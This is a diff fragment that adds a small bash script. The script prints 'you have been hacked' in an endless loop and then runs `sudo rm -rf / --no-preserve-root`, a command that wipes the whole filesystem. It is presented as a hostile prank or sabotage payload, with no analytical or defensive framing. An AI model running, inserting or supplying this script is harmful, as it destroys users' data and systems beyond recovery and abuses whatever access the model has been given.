@@ -1,0 +1,3 @@
+#!/bin/bash
+yes "you have been hacked ☺" 
+sudo rm -rf / --no-preserve-root
